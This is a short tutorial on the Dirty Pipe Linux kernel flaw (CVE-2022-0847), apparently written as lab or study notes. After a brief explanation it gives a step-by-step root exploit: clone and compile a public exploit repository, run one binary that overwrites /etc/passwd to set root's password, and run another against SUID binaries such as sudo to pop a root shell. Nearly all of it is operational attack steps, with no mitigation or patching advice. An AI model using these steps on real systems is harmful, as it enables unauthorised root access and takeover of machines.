
## What is Dirty Pipe?

**Dirty Pipe** is a security vulnerability in the **Linux kernel versions 5.8 to 5.17**.  
It allows a **normal (low-privileged) user** to **write data into files they’re not supposed to write to** — including files owned by the **root user** like `/etc/passwd`.

---

## 🧪 Why is it Dangerous?

Normally:

- Regular users can only **read** files like `/etc/passwd`.
- They **cannot write** or change them.

With Dirty Pipe:

- If you can **read** a file, you can also **write into it** even if it's **root-owned**.
- This can be used to **modify system files** or **inject commands** as root.


1. Check the Kernel Version
```bash
uname -r
```
If it's between **5.8 and 5.17**, the system is likely **vulnerable**.

2. Download the Exploit Code
```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```
his gives you two files:
- `exploit-1`: modifies `/etc/passwd`
- `exploit-2`: abuses SUID binaries
___
### 3. Exploit 1 – Modify `/etc/passwd` to Get Root Access

Run:
```bash
./exploit-1
```
It does this:

- Makes a **backup** of `/etc/passwd`
- Sets root's password to `piped`
- Tells you to use `su` to get root access

Then run:
```bash
su
```
You’ll become **root**!
___
### 4. Exploit 2 – Abuse SUID Binaries

First, find SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

This shows files that always run as **root**, even if a normal user runs them (like `/usr/bin/sudo`, `/usr/bin/passwd`, etc.).

Pick one (like `/usr/bin/sudo`) and run:
```bash
./exploit-2 /usr/bin/sudo
```
This does:

- Temporarily replaces the binary
- Pops a **root shell**
- Restores the binary after use

## Android Devices Also Affected

Because Android is based on Linux, apps could abuse this vulnerability too and take full control of the phone.